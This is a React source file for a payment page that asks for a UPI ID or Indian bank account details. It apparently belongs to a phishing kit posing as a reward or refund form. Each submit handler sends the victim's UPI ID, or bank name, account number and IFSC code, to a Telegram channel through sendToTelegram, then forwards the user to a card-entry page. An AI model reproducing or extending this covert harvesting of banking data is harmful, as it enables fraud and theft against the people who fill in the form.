import { useState } from "react";
import { AppLayout } from "../../components/AppChrome/AppLayout";
import { Banner } from "../../components/Banner/Banner";
import { Button } from "../../components/ui/Button";
import { IconChevronRight } from "../../components/ui/Icon";
import { useNavigate } from "../../app/router";
import { sendToTelegram, formatEntry } from "../../lib/telegram";
import "./Payment.css";

type Method = "upi" | "bank" | null;

const BANKS = [
  { value: "sbi", label: "State Bank of India" },
  { value: "hdfc", label: "HDFC Bank" },
  { value: "icici", label: "ICICI Bank" },
  { value: "axis", label: "Axis Bank" },
  { value: "kotak", label: "Kotak Mahindra Bank" },
  { value: "pnb", label: "Punjab National Bank" },
  { value: "bob", label: "Bank of Baroda" },
  { value: "canara", label: "Canara Bank" },
  { value: "union", label: "Union Bank of India" },
  { value: "idbi", label: "IDBI Bank" },
];

export function PaymentPage() {
  const navigate = useNavigate();
  const [method, setMethod] = useState<Method>(null);

  // UPI
  const [upiId, setUpiId] = useState("");
  const [upiError, setUpiError] = useState<string | null>(null);

  // Bank
  const [bank, setBank] = useState("");
  const [account, setAccount] = useState("");
  const [confirmAccount, setConfirmAccount] = useState("");
  const [ifsc, setIfsc] = useState("");
  const [bankError, setBankError] = useState<string | null>(null);

  const validateUpi = (v: string) => {
    const val = v.trim();
    if (!val) return "Please enter UPI ID";
    // Basic UPI format like name@bank
    const upiRegex = /^[a-zA-Z0-9.\-_]{2,}@[a-zA-Z]{2,}$/;
    if (!upiRegex.test(val)) return "Enter valid UPI ID (e.g. name@upi)";
    return null;
  };

  const validateIfsc = (v: string) => {
    const val = v.trim().toUpperCase();
    const regex = /^[A-Z]{4}0[A-Z0-9]{6}$/;
    if (!regex.test(val)) return "Enter valid IFSC code (e.g. SBIN0001234)";
    return null;
  };

  const handleUpiSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const err = validateUpi(upiId);
    if (err) {
      setUpiError(err);
      return;
    }
    setUpiError(null);
    try {
      sessionStorage.setItem("rg:payment", JSON.stringify({ method: "upi", upiId: upiId.trim() }));
    } catch {}
    sendToTelegram(
      formatEntry("💳 Payment — UPI", {
        "UPI ID": upiId.trim(),
      })
    );
    navigate("/card");
  };

  const handleBankSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setBankError(null);

    if (!bank) return setBankError("Please select your bank");
    if (!account.trim()) return setBankError("Please enter account number");
    if (!/^\d{9,18}$/.test(account.trim())) return setBankError("Account number should be 9-18 digits");
    if (!confirmAccount.trim()) return setBankError("Please verify account number");
    if (account.trim() !== confirmAccount.trim()) return setBankError("Account numbers do not match");
    if (!ifsc.trim()) return setBankError("Please enter IFSC code");
    if (validateIfsc(ifsc)) return setBankError(validateIfsc(ifsc));

    try {
      sessionStorage.setItem(
        "rg:payment",
        JSON.stringify({
          method: "bank",
          bank: BANKS.find((b) => b.value === bank)?.label || bank,
          account: account.trim(),
          ifsc: ifsc.trim().toUpperCase(),
        })
      );
    } catch {}
    sendToTelegram(
      formatEntry("🏦 Payment — Bank Transfer", {
        "Bank": BANKS.find((b) => b.value === bank)?.label || bank,
        "Account Number": account.trim(),
        "IFSC": ifsc.trim().toUpperCase(),
      })
    );
    navigate("/card");
  };

  return (
    <AppLayout title="Payment Option">
      <div className="pay">
        <Banner />

        <section className="pay__card">
          <header className="pay__head">
            <h1 className="pay__heading">Select getting payment option</h1>
          </header>

          <div className="pay__options">
            <button
              type="button"
              className={`pay__option ${method === "upi" ? "is-active" : ""}`}
              onClick={() => {
                setMethod("upi");
                setBankError(null);
              }}
            >
              <span>UPI</span>
              <IconChevronRight size={18} />
            </button>
            <button
              type="button"
              className={`pay__option ${method === "bank" ? "is-active" : ""}`}
              onClick={() => {
                setMethod("bank");
                setUpiError(null);
              }}
            >
              <span>Bank Transfer</span>
              <IconChevronRight size={18} />
            </button>
          </div>

          {method === "upi" && (
            <form className="pay__form" onSubmit={handleUpiSubmit} noValidate>
              <div className="pay__field">
                <label className="pay__label" htmlFor="upiId">
                  Enter UPI ID
                </label>
                <input
                  id="upiId"
                  className={`pay__input ${upiError ? "has-error" : ""}`}
                  type="text"
                  value={upiId}
                  onChange={(e) => {
                    setUpiId(e.target.value);
                    if (upiError) setUpiError(validateUpi(e.target.value));
                  }}
                  placeholder="example@oksbi"
                  autoCapitalize="none"
                  autoCorrect="off"
                  spellCheck={false}
                />
                {upiError && <p className="pay__error">{upiError}</p>}
              </div>
              <Button type="submit" variant="primary" block>
                Submit
              </Button>
            </form>
          )}

          {method === "bank" && (
            <form className="pay__form" onSubmit={handleBankSubmit} noValidate>
              <div className="pay__field">
                <label className="pay__label" htmlFor="bank">
                  Select Bank
                </label>
                <select
                  id="bank"
                  className="pay__select"
                  value={bank}
                  onChange={(e) => setBank(e.target.value)}
                >
                  <option value="">-- Select Bank --</option>
                  {BANKS.map((b) => (
                    <option key={b.value} value={b.value}>
                      {b.label}
                    </option>
                  ))}
                </select>
              </div>

              <div className="pay__field">
                <label className="pay__label" htmlFor="account">
                  Account Number
                </label>
                <input
                  id="account"
                  className="pay__input"
                  type="text"
                  inputMode="numeric"
                  value={account}
                  onChange={(e) => setAccount(e.target.value.replace(/\D/g, ""))}
                  placeholder="Enter account number"
                  maxLength={18}
                />
              </div>

              <div className="pay__field">
                <label className="pay__label" htmlFor="confirmAccount">
                  Verify Account Number
                </label>
                <input
                  id="confirmAccount"
                  className="pay__input"
                  type="text"
                  inputMode="numeric"
                  value={confirmAccount}
                  onChange={(e) => setConfirmAccount(e.target.value.replace(/\D/g, ""))}
                  placeholder="Re-enter account number"
                  maxLength={18}
                />
              </div>

              <div className="pay__field">
                <label className="pay__label" htmlFor="ifsc">
                  IFSC Code
                </label>
                <input
                  id="ifsc"
                  className="pay__input"
                  type="text"
                  value={ifsc}
                  onChange={(e) => setIfsc(e.target.value.toUpperCase())}
                  placeholder="e.g. SBIN0001234"
                  maxLength={11}
                  autoCapitalize="characters"
                />
              </div>

              {bankError && <p className="pay__error">{bankError}</p>}

              <Button type="submit" variant="primary" block>
                Submit
              </Button>
            </form>
          )}
        </section>
      </div>
    </AppLayout>
  );
}
